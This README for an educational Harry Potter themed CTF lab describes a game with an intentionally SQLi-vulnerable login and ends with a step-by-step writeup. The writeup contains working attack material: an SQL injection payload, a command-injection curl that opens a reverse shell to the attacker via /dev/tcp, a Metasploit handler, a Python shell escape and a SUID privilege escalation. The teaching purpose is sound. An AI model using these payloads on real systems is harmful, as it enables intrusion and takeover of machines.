<!-- ╔══════════════════════════════════════════════════════════════╗ -->
<!--                        HOGWARTS CTF — README                     -->
<!-- ╚══════════════════════════════════════════════════════════════╝ -->

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:4b0d0f,50:7b1113,100:b8860b&height=230&section=header&text=Hogwarts%20CTF&fontSize=72&fontColor=ffe9a8&fontAlignY=38&desc=CTF%20educativo%20con%20tematica%20Harry%20Potter&descAlignY=60&descSize=18" alt="Hogwarts CTF" width="100%" />

<br/>

**`⚡ Kali → Docker`** &nbsp;•&nbsp; **`🎮 Juego web en el puerto 3000`** &nbsp;•&nbsp; **`🎓 100% educativo`**

<br/>

<!-- Stack badges -->
![Node.js](https://img.shields.io/badge/Node.js-22_LTS-339933?style=for-the-badge&logo=node.js&logoColor=white)
![Express](https://img.shields.io/badge/Express-Backend-000000?style=for-the-badge&logo=express&logoColor=white)
![SQLite](https://img.shields.io/badge/SQLite-DB-003B57?style=for-the-badge&logo=sqlite&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Deploy-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![PHP](https://img.shields.io/badge/PHP_8-flags_content-777BB4?style=for-the-badge&logo=php&logoColor=white)

<br/>

![Tipo](https://img.shields.io/badge/CTF-Educativo-7b1113?style=flat-square)
![SQLi](https://img.shields.io/badge/Reto_1-SQL_Injection-b8860b?style=flat-square)
![Source](https://img.shields.io/badge/Reto_2-Code_Inspection-b8860b?style=flat-square)

</div>

---

<div align="center">

### 🏰 &nbsp;Sobre el proyecto

</div>

**Hogwarts CTF** es un **CTF educativo** con temática Harry Potter. Pensado como
**laboratorio de pentesting**: una máquina **Kali** 🐉 escanea un **Docker** 🐳
que contiene un juego en el **puerto 3000**. Enseña dos conceptos de seguridad:

> 1. 💉 &nbsp;**Inyección SQL** — en el login.
> 2. 🔍 &nbsp;**Inspección de código fuente** — frase oculta en el DOM.

El login es **funcional**: los usuarios registrados entran con sus credenciales
y, además, existe la **brecha SQLi**.

<br/>

<div align="center">

### 🧭 &nbsp;Tabla de contenido

</div>

| 🗂️ | Sección | 🗂️ | Sección |
|:--:|:--|:--:|:--|
| 📁 | [Estructura](#-estructura) | 🗺️ | [El Mapa del Merodeador](#️-el-mapa-del-merodeador) |
| 🧭 | [Ruta del juego](#-ruta-del-juego) | 🧩 | [Qué está hecho](#-qué-está-hecho-y-qué-queda-como-placeholder) |
| 🎯 | [Los dos retos del CTF](#-los-dos-retos-del-ctf) | 🪄 | [Pantallas de misión](#-pantallas-de-misión-misionn) |
| | | 🧙 | [**Guía de resolución (writeup)**](#-guía-de-resolución-paso-a-paso-writeup) |

---

## 📁 Estructura

```text
hogwarts-ctf/
├── package.json
├── server.js              # Backend Express (login VULNERABLE a SQLi, a propósito)
├── db/
│   ├── init.js                 # Crea/siembra la BD (importa usuarios de /etc/passwd)
│   ├── lab-users.example.json  # Plantilla de contraseñas de lab por usuario
│   └── hogwarts.db             # (se genera al ejecutar initdb)
└── public/
    ├── index.html            # 1) Login  (pestaña: "Howgarts")
    ├── personalizacion.html  # 2) Crea tu mago (personaje SVG + opciones)
    ├── juramento.html        # 3) El pergamino cerrado: carta + juramento (Reto 2)
    ├── mapa.html             # 4) Mapa del Merodeador (pestaña: "Mapa del Merodeador")
    ├── mision.html           # 5) Tablero de cada misión (se sirve en /mision/1..8)
    ├── css/
    │   ├── global.css        # Tema compartido (fondo, botones, modales, transiciones)
    │   ├── avatar.css        # Colores y variantes del mago chibi (jugador y personajes)
    │   ├── login.css
    │   ├── personalizacion.css  # Medallón, pestañas, tarjetas y estandartes
    │   ├── juramento.css     # Pergamino en 3D, sobre lacrado, barra del conjuro
    │   ├── mapa.css          # HUD, plano, niebla, huellas, diálogos, cinemáticas
    │   └── mision.css        # Tablero de misión, salas decoradas, rayo del hechizo
    └── js/
        ├── flujo.js          # Orden de las pantallas y guardias de ruta
        ├── avatar.js         # Dibujo SVG del mago (jugador y personajes), Sombrero, espada
        ├── login.js
        ├── personalizacion.js   # Opciones, miniaturas, nombre, "Sorpréndeme", guardado
        ├── juramento.js      # Carta, validación del juramento, apertura del mapa
        ├── estado.js         # Partida: vidas, reloj de 40 min, misiones, pistas
        ├── castillo.js       # Plano de Hogwarts: salas, pasillos, puertas, colisiones
        ├── historia.js       # Personajes, diálogos, misiones y pistas (contenido)
        ├── animaciones.js    # Cinemáticas: espada, horrocrux, game over, victoria
        ├── hud.js            # Barra superior: misiones, pistas, tiempo, vidas, pausa
        ├── mapa.js           # Motor: movimiento, cámara, huellas, diálogos, patrullas
        ├── mision.js         # Pantalla de misión: tablero, hechizo, rayo, vidas y reloj
        ├── salas.js          # Decoración de las 8 salas alrededor del tablero
        └── salas-piezas.js   # Piezas SVG: ventanas, estanterías, velas, calderos, plantas…
```

---

## 🧭 Ruta del juego

```text
index.html ──► personalizacion.html ──► juramento.html ──► mapa.html ──► /mision/1..8
  Login           Crea tu mago            Pergamino +          Mapa del
  (Reto 1)                                carta (Reto 2)       Merodeador
```

Cada pantalla deja una marca en `localStorage` al completarse, y la siguiente
la exige al cargar (`js/flujo.js`). Si falta un paso, el navegador vuelve al
primero pendiente antes de pintar la página.

<div align="center">

| ✅ Paso completado | 🔑 Clave en `localStorage` | 🚪 La exige |
|:--|:--|:--|
| Login | `howgarts_sesion` | `personalizacion.html` |
| Personaje creado | `howgarts_personaje` | `juramento.html` |
| Juramento pronunciado | `howgarts_juramento` | `mapa.html` |

</div>

La partida del mapa (vidas, reloj, misiones, pistas, posición) se guarda en
`howgarts_partida` (ver `js/estado.js`).

---

## 🎯 Los dos retos del CTF

### 💉 Reto 1 — Inyección SQL (Login)

El backend construye la consulta concatenando la entrada del usuario
(`server.js`, zona marcada). Para entrar **sin conocer ninguna contraseña**,
escribe en el campo **usuario**:

```sql
' OR 1=1 --
```

> *(la contraseña puede quedar vacía o con cualquier texto).*

### 🔍 Reto 2 — Inspección de código (Pergamino)

Tras crear el personaje aparece `juramento.html`: la portada del **Mapa del
Merodeador**, todavía cerrado, y un **sobre lacrado** (con el escudo y el lacre
rojo). Al hacer clic se rompe el lacre y se lee la carta de Hogwarts, que dice:
*"en la fuente del castillo debes mirar"* → pista para abrir las **DevTools** e
inspeccionar el código fuente. Escondido en el DOM (`juramento.html`) hay un
`div` con `display:none` que contiene:

```text
Juro solemnemente que mis intenciones no son buenas
```

Al escribirlo en la barra del conjuro (no distingue mayúsculas, tildes ni
puntuación), la tinta se extiende por el pergamino, **el mapa se despliega** y
se entra en el Mapa del Merodeador. Con un juramento incorrecto responde uno de
los merodeadores (Lunático, Colagusano, Canuto o Cornamenta).

> La frase **no** está escrita en `juramento.js`: el script la lee del `div`
> oculto, así que ese `div` es el único sitio donde encontrarla.

🎨 El arte del pergamino es SVG dibujado para esta pantalla (sin imágenes
externas): portada en español, interior del castillo y sobre.

---

## 🗺️ El Mapa del Merodeador

**🏁 Inicio.** El jugador aparece en el Gran Comedor junto al **Sombrero
Seleccionador**, que le dice su casa («Veo que eres… ¡GRYFFINDOR!») y le
entrega la **Espada de Gryffindor** («te será útil más adelante en tu estancia
en Hogwarts»). En ese momento empieza a correr el reloj.

**🌫️ El mapa.** Es sombrío, con la paleta del login: solo se ve con claridad
alrededor del mago del jugador (el mismo de la personalización, con su
nombre). Bajo la sombra se ven las **huellas con el nombre** de cada personaje;
al acercarse aparece el personaje y al alejarse vuelve a ser huellas. Se
camina por los pasillos y las salas: **las paredes no se atraviesan**.

**🧝 Personajes y misiones** (cada uno pide ayuda con un horrocrux):

<div align="center">

| # | 🧙 Personaje | 🩸 Misión | 📍 Dónde está |
|:-:|:--|:--|:--|
| 1 | Ginny Weasley | Diario de Tom Riddle | Baño de Myrtle la Llorona |
| 2 | Albus Dumbledore | Anillo de Sorvolo Gaunt | Despacho del director |
| 3 | Ron Weasley | Guardapelo de Slytherin | Sala común de Gryffindor |
| 4 | Hermione Granger | Copa de Hufflepuff | Biblioteca |
| 5 | Luna Lovegood | Diadema de Ravenclaw | Torre de Ravenclaw |
| 6 | Neville Longbottom | Nagini | Invernaderos |
| 7 | Severus Snape | El último horrocrux: el propio jugador (aparece al completar las 6 primeras) | Mazmorras |
| 8 | Lord Voldemort | Duelo final (aparece al completar las 7) | Gran Comedor |

</div>

Las misiones **1 a 6** se pueden hacer en cualquier orden. Snape no está en el mapa
hasta completarlas: aparece entre una nube de humo, sin aviso, y hay que
buscarlo. Al completar la 7 llega Voldemort y **el reloj baja a 5 minutos** (si
quedaba menos, se mantiene); en los dos casos el reloj tiembla en rojo para
avisar al jugador.

Al acercarse sale un bocadillo («¡Nombre! Tengo una misión para ti»). El
diálogo termina con **Cerrar** (entrega la pista) o **Aceptar misión** (entrega
la pista y lleva a `/mision/N`). La misión aparece en la lista al hablar y se
tacha al completarla. Voldemort tiene su propio diálogo desafiante y termina
con **Aceptar duelo**.

**📊 Barra superior.** Misiones (n/7), Pistas, barra de **tiempo de 40 minutos**
(global: sigue corriendo dentro de las misiones y no se reinicia al recargar),
**3 vidas** ❤️, la espada y **Pausa** («¡Travesura realizada!»: tapa el mapa y
detiene el reloj).

**💔 Vidas.** Se pierde una al fallar dentro de una misión, o si te pillan **Argus
Filch** o la **Señora Norris**, que patrullan los pasillos (sus huellas se ven
en rojo). Las vidas no restan tiempo.

**⚔️ Horrocrux destruido.** Al volver de una misión superada, el mago del jugador
alza la Espada de Gryffindor por detrás de la cabeza y la deja caer como un
hachazo: el horrocrux se parte y escapan almas entre humo negro. En la misión 7
(el horrocrux es el propio jugador) el mago cae, el fragmento oscuro sale de él
y la Piedra de la Resurrección le devuelve la vida.

**💀 Fin de partida.** Sin vidas o sin tiempo, Voldemort lanza su hechizo, el mago
del jugador cae con los ojos en X y la lengua fuera, y aparece **GAME OVER**
con **Reintentar**, que empieza la partida desde cero. Al superar el duelo
final aparece la victoria. 🏆

**🎮 Controles.** <kbd>↑</kbd> <kbd>↓</kbd> <kbd>←</kbd> <kbd>→</kbd> o
<kbd>W</kbd> <kbd>A</kbd> <kbd>S</kbd> <kbd>D</kbd> para moverse,
<kbd>E</kbd> (o <kbd>Enter</kbd>) para hablar, <kbd>P</kbd> o <kbd>Esc</kbd> para pausar.

---

## 🧩 Qué está hecho y qué queda como placeholder

<table>
<tr><td valign="top" width="60%">

**✅ Completo y funcional:**
- Login + backend con la SQLi intencional y BD SQLite sembrada.
- Creación del personaje: mago chibi en SVG sobre un medallón de pergamino,
  con pestañas **Aspecto** (4 peinados, 6 colores de pelo, 6 tonos de piel,
  5 colores de ojos, cicatriz), **Equipo** (gafas, varita y mascota) y
  **Casa** (estandartes con descripción). Miniaturas en vivo, botón
  "Sorpréndeme" y recuerdo de la última elección en `localStorage`.
- Pergamino: carta de Hogwarts en sobre lacrado, reto de la frase oculta y
  animación del mapa que se abre (respeta `prefers-reduced-motion`).
- Mapa del Merodeador completo: Sombrero Seleccionador, 7 misiones con
  diálogo, Voldemort final, pasillos con paredes, niebla, huellas con nombre,
  Filch y la Señora Norris, barra de misiones / pistas / tiempo (40 min) /
  vidas / pausa, game over y victoria.
- Ruta ordenada entre pantallas (`js/flujo.js`).
- Pantallas de misión (`/mision/1..8`).

</td><td valign="top" width="40%">

**🚧 Pendiente:**
- Las pistas y algunos diálogos de `js/historia.js` son provisionales:
  cámbialas por pistas de cada reto.

</td></tr>
</table>

---

## 🪄 Pantallas de misión (`/mision/N`)

Todas usan la misma página (`mision.html`): un **tablero** central con el
horrocrux en su altar de runas, la pista del personaje, el reloj, las vidas y
la caja del hechizo. Alrededor se dibuja la **sala** de la misión (baño de
Myrtle, despacho, sala común, biblioteca, torre de Ravenclaw, invernaderos,
mazmorras o Gran Comedor), con su propia decoración animada.

- ⚡ **Hechizo correcto:** el rayo alcanza al horrocrux, que se agrieta, y se
  vuelve al mapa (`/mapa.html?completada=N`), donde se ve la animación de la
  espada. En la misión 8 se gana la partida.
- 🛡️ **Hechizo incorrecto:** el rayo rebota y se pierde una vida. Sin vidas, se
  vuelve al mapa y aparece el game over.
- 📭 **Caja vacía o hechizo ya fallado en esa misión:** aviso, sin perder vida.
- ↩️ **Volver al mapa** (o <kbd>Esc</kbd>): sin penalización. El reloj sigue corriendo.
- 💡 **Bombillo "Pista de experto":** revela el tema real del reto (Wireshark,
  Burp Suite, SUID/Kernel…) como ayuda muy clara. Cuesta **3 minutos** de
  reloj y se cobra una sola vez por misión (después queda encendido y se puede
  volver a mirar sin coste). El tema lo sirve el servidor en
  `GET /api/pista/:mision` (tabla `TECNICAS` en `server.js`), así que no está
  escrito en la página; el descuento de tiempo lo aplica el cliente en
  `js/estado.js` (`usarPistaTecnica`), como el resto del reloj.

El hechizo correcto **nunca llega al navegador**: la página envía lo que
escribe el jugador a `POST /api/hechizo` y el servidor solo responde si acierta.
En el servidor tampoco están escritos: se guardan **cifrados** (sal aleatoria +
scrypt) en `lib/hechizos.js`. Se ignoran mayúsculas, tildes, espacios, guiones
y guiones bajos (`Wingardium Leviosa` = `wingardium_leviosa`).

**🔄 Cambiar un hechizo:**

```bash
npm run hechizo -- "Nuevo hechizo"
```

Imprime una línea `{ sal: '…', hash: '…' },`: pégala en la misión que toque de
`lib/hechizos.js` y reinicia el servidor.

> 🔐 El cifrado evita que se lean de un vistazo. Quien tenga el archivo y una
> lista de hechizos candidatos podría probarlos uno a uno: scrypt hace que cada
> prueba sea lenta, pero no lo impide.

<details>
<summary><b>🧪 Funciones útiles y atajos de depuración</b></summary>

<br/>

**Consola del navegador en el mapa:**
```js
perderVida();        // quita 1 corazón (a 0: game over)
completarMision(3);  // completa la misión 3 (horrocrux destruido, tachada)
```

También se puede simular el regreso de una misión con `/mapa.html?completada=3`
o `/mapa.html?fallo=3`.

**Probar un hechizo sin el navegador:**
```bash
curl -X POST http://localhost/api/hechizo -H 'Content-Type: application/json' -d '{"mision":1,"hechizo":"lumos"}'
```

**Empezar el recorrido desde cero (consola del navegador):**
```js
localStorage.clear(); location.href = '/';
```

</details>

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=0:7b1113,100:b8860b&height=70&section=header&text=Guia%20de%20resolucion%20%E2%80%94%20Writeup&fontSize=28&fontColor=ffe9a8&fontAlignY=52" alt="Writeup" width="100%" />

</div>

## 🧙 Guía de resolución paso a paso (writeup)

> [!CAUTION]
> Recorrido consolidado del laboratorio y comandos de referencia para resolver
> el CTF de principio a fin. Los valores `192.168.x.x` / `156.168.x.0` son
> **placeholders**: reemplázalos por la IP real de la VM víctima y por la de tu
> máquina atacante (Kali) según tu red. Material **educativo**; úsalo solo en el
> entorno aislado del laboratorio.

<div align="center">

**Flujo de la intrusión**

`🌐 Recon` ➜ `🔑 SSH` ➜ `🖼️ Stego` ➜ `🧰 Burp` ➜ `🎯 Metasploit` ➜ `🐍 Python` ➜ `🧬 SUID/Kernel` ➜ `👑 root`

</div>

### 🐳 Despliegue del contenedor

```bash
docker run -d --name hogwarts-ctf -p 80:80 -p 2222:22 -p 3000:3000 jleguizamonm/hogwarts-ctf:latest
```

### 1️⃣ Reconocimiento web / Wireshark

```bash
sudo nmap -sn 156.168.x.0/24      # descubrir hosts en la red
sudo nmap -sS -sV 192.168.x.x     # puertos y servicios de la víctima
```

- 🔎 Revisar los puertos **80** y **3000** (HTTP) en el navegador.
- 🗂️ Consultar `robots.txt` en el navegador para ubicar la ruta del directorio con
  el archivo **`.pcap`** y analizarlo con **Wireshark** para obtener las
  credenciales de **dobby** y el **primer hechizo**.

### 2️⃣ SSH

Conectarse con las credenciales de **dobby** obtenidas del `.pcap`:

```bash
ssh dobby@192.168.x.x -p 2222
ls -la ~
cat ~/MensajeDeLucius.txt
```

### 3️⃣ Esteganografía

- 🖼️ Inspeccionar los archivos del entorno (como `slytherin.jpeg` o los recursos
  disponibles) para extraer datos ocultos.

### 4️⃣ Burp Suite

- 🧰 Acceder a `vault.php` en el navegador e interceptar la petición **POST** de
  inicio de sesión con **Burp Suite**.
- ✏️ Modificar `guest` por `admin`, soltar la intercepción y acceder a la segunda
  pantalla.

### 5️⃣ Metasploit

**🖥️ Consola 1** — handler a la escucha:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST 192.168.x.x
set LPORT 4444
run -j
```

**🖥️ Consola 2** — disparar la reverse shell (inyección de comandos en `ping.php`):

```bash
curl -s -G --data-urlencode "ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.x.x/4444 0>&1'" "http://192.168.x.x/ping.php"
```

**🖥️ Consola 1** — tomar la sesión recibida:

```bash
sessions -i 1
cd /home/bellatrix
```

### 6️⃣ Inyección Python

```bash
sudo -l 2>/dev/null
ls -la /home
sudo -u lucius /home/bellatrix/alimentar_nagini.py
```

🐍 En el prompt del script, escapar a una shell como **lucius**:

```python
__import__('os').system('/bin/bash')
```

Dentro de la sesión de **lucius**:

```bash
cd /home/lucius
cat nagini_derrotada.txt
```

- 🔗 Visitar el enlace mostrado en el archivo.

### 7️⃣ Kernel / SUID

```bash
find / -perm -4000 -o -perm -2000 2>/dev/null
ls -la /home/lucius.* /root /opt/* /var/www/html 2>/dev/null
find /tmp -maxdepth 0 -exec /bin/sh -p \;
id
cat /opt/ministerio/harry_sacrificio.txt
```

### 8️⃣ 👑 Root — último hechizo

Con el usuario ya como **root**, basta moverse a la carpeta `ROOT` para ver el
último hechizo:

```bash
cd /root/horcruxes
cat voldemort_final.txt
```

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:b8860b,100:4b0d0f&height=120&section=footer&text=Mischief%20Managed%20%E2%9A%A1&fontSize=26&fontColor=ffe9a8&fontAlignY=70" alt="footer" width="100%" />

<sub>🎓 Proyecto educativo de ciberseguridad.</sub>

</div>
